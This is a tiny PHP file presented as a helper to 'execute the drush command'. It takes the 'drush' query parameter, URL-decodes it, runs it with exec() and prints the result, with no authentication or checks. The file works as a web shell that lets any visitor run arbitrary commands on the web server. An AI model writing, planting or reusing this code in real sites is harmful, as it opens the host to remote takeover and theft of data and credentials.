<?php
/**
 * Execute the drush command...
 */
$drush = urldecode($_GET['drush']);
exec($drush, $output);
print_r($output);
